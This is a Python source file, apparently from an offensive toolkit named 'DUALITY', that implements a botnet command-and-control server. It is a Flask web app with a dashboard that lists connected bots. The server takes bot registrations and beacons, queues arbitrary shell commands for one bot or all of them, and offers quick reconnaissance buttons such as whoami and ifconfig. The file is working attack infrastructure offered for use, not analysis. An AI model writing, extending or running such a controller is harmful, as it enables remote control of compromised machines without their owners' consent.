#!/usr/bin/env python3
# C2 SERVER WITH GUI - Command & Control dengan Web Interface
import os
import threading
import time
import json
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify
from core.colors import Colors

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C2 Dashboard - DUALITY</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0e1a;
            color: #00ff88;
            font-family: 'Courier New', monospace;
            padding: 20px;
        }
        h1 { color: #ff4444; text-align: center; margin-bottom: 20px; }
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        .stat-card {
            background: rgba(0,0,0,0.7);
            border: 1px solid #00ff88;
            border-radius: 10px;
            padding: 15px;
            text-align: center;
        }
        .stat-number { font-size: 36px; font-weight: bold; }
        .stat-label { font-size: 12px; color: #888; margin-top: 5px; }
        .container { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
        .panel {
            background: rgba(0,0,0,0.7);
            border: 1px solid #00ff88;
            border-radius: 10px;
            padding: 15px;
        }
        .panel h2 { margin-bottom: 15px; font-size: 18px; }
        .bot-list { max-height: 400px; overflow-y: auto; }
        .bot-item {
            background: #0a0e1a;
            padding: 10px;
            margin: 5px 0;
            border-left: 3px solid #00ff88;
            cursor: pointer;
        }
        .bot-item:hover { background: #1a1a2e; }
        .bot-name { font-weight: bold; }
        .bot-ip { font-size: 11px; color: #888; }
        .online { color: #00ff88; }
        .offline { color: #ff4444; }
        .command-input {
            width: 100%;
            padding: 10px;
            background: #0a0e1a;
            border: 1px solid #00ff88;
            color: #00ff88;
            margin: 10px 0;
            font-family: monospace;
        }
        button {
            background: #00ff88;
            color: #0a0e1a;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            font-weight: bold;
            margin-right: 10px;
        }
        button:hover { background: #00cc66; }
        .console {
            background: #0a0e1a;
            height: 300px;
            overflow-y: auto;
            font-family: monospace;
            font-size: 12px;
            padding: 10px;
            margin-top: 10px;
        }
        .log-line { margin: 2px 0; border-left: 2px solid #00ff88; padding-left: 8px; }
    </style>
</head>
<body>
    <h1>🎮 DUALITY C2 SERVER</h1>
    
    <div class="stats">
        <div class="stat-card">
            <div class="stat-number" id="totalBots">0</div>
            <div class="stat-label">Total Bots</div>
        </div>
        <div class="stat-card">
            <div class="stat-number" id="activeBots">0</div>
            <div class="stat-label">Active Bots</div>
        </div>
        <div class="stat-card">
            <div class="stat-number" id="commandsSent">0</div>
            <div class="stat-label">Commands Sent</div>
        </div>
    </div>
    
    <div class="container">
        <div class="panel">
            <h2>🤖 Connected Bots</h2>
            <div class="bot-list" id="botList"></div>
        </div>
        
        <div class="panel">
            <h2>⚡ Command Center</h2>
            <select id="botSelect" class="command-input">
                <option value="all">🌐 ALL BOTS</option>
            </select>
            <input type="text" id="commandInput" class="command-input" placeholder="Enter command..." onkeypress="if(event.keyCode==13) sendCommand()">
            <div>
                <button onclick="sendCommand()">🚀 Send</button>
                <button onclick="quickCommand('whoami')">whoami</button>
                <button onclick="quickCommand('pwd')">pwd</button>
                <button onclick="quickCommand('ls')">ls</button>
                <button onclick="quickCommand('ifconfig')">ifconfig</button>
            </div>
            <div class="console" id="console"></div>
        </div>
    </div>
    
    <script>
        let commandsCount = 0;
        
        function addLog(msg) {
            let consoleDiv = document.getElementById('console');
            let time = new Date().toLocaleTimeString();
            consoleDiv.innerHTML = `<div class="log-line">[${time}] ${msg}</div>` + consoleDiv.innerHTML;
            if(consoleDiv.children.length > 50) consoleDiv.removeChild(consoleDiv.lastChild);
        }
        
        function loadBots() {
            fetch('/api/bots')
                .then(res => res.json())
                .then(data => {
                    let bots = data.bots;
                    let botList = '';
                    let botSelect = '<option value="all">🌐 ALL BOTS</option>';
                    let active = 0;
                    
                    for(let id in bots) {
                        let bot = bots[id];
                        if(bot.status === 'active') active++;
                        botList += `
                            <div class="bot-item" onclick="selectBot('${id}')">
                                <div class="bot-name">${id}</div>
                                <div class="bot-ip">IP: ${bot.ip} | Last: ${bot.last_seen}</div>
                            </div>
                        `;
                        botSelect += `<option value="${id}">${id}</option>`;
                    }
                    
                    document.getElementById('botList').innerHTML = botList || '<p>No bots connected</p>';
                    document.getElementById('botSelect').innerHTML = botSelect;
                    document.getElementById('totalBots').innerText = Object.keys(bots).length;
                    document.getElementById('activeBots').innerText = active;
                });
        }
        
        function selectBot(botId) {
            document.getElementById('botSelect').value = botId;
            addLog(`Selected bot: ${botId}`);
        }
        
        function quickCommand(cmd) {
            document.getElementById('commandInput').value = cmd;
            sendCommand();
        }
        
        function sendCommand() {
            let botId = document.getElementById('botSelect').value;
            let command = document.getElementById('commandInput').value;
            if(!command) return;
            
            fetch('/api/send_command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({bot_id: botId, command: command})
            }).then(() => {
                commandsCount++;
                document.getElementById('commandsSent').innerText = commandsCount;
                addLog(`→ Command sent to ${botId}: ${command}`);
                document.getElementById('commandInput').value = '';
            });
        }
        
        setInterval(loadBots, 3000);
        loadBots();
        addLog('[*] C2 Server started');
    </script>
</body>
</html>
'''

class C2GUI:
    def __init__(self):
        self.name = "C2 Server with GUI"
        self.bots = {}
        self.commands = {}
        self.app = Flask(__name__)
        self.setup_routes()
    
    def setup_routes(self):
        @self.app.route('/')
        def index():
            return render_template_string(HTML_TEMPLATE)
        
        @self.app.route('/api/bots')
        def get_bots():
            return jsonify({"bots": self.bots})
        
        @self.app.route('/api/register', methods=['POST'])
        def register():
            data = request.json
            bot_id = data.get('bot_id')
            self.bots[bot_id] = {
                "ip": data.get('ip'),
                "hostname": data.get('hostname'),
                "os": data.get('os'),
                "last_seen": str(datetime.now()),
                "status": "active"
            }
            return jsonify({"status": "ok"})
        
        @self.app.route('/api/beacon/<bot_id>')
        def beacon(bot_id):
            if bot_id in self.bots:
                self.bots[bot_id]['last_seen'] = str(datetime.now())
                self.bots[bot_id]['status'] = "active"
            if bot_id in self.commands and self.commands[bot_id]:
                return jsonify({"command": self.commands[bot_id].pop(0)})
            return jsonify({})
        
        @self.app.route('/api/report/<bot_id>', methods=['POST'])
        def report(bot_id):
            return jsonify({"status": "ok"})
        
        @self.app.route('/api/send_command', methods=['POST'])
        def send_cmd():
            data = request.json
            bot_id = data.get('bot_id')
            command = data.get('command')
            if bot_id == "all":
                for bid in self.bots:
                    if bid not in self.commands:
                        self.commands[bid] = []
                    self.commands[bid].append(command)
            else:
                if bot_id not in self.commands:
                    self.commands[bot_id] = []
                self.commands[bot_id].append(command)
            return jsonify({"status": "ok"})
    
    def run(self):
        print(f"\n{Colors.CYAN}[*] {self.name}{Colors.END}")
        print(f"{Colors.GREEN}[+] C2 Server starting on http://localhost:5000{Colors.END}")
        print(f"{Colors.YELLOW}[!] Open browser to access GUI{Colors.END}")
        print(f"{Colors.DIM}[*] Bot client: python3 bot_client.py --server http://YOUR_IP:5000{Colors.END}\n")
        
        self.app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)

if __name__ == "__main__":
    c2 = C2GUI()
    c2.run()
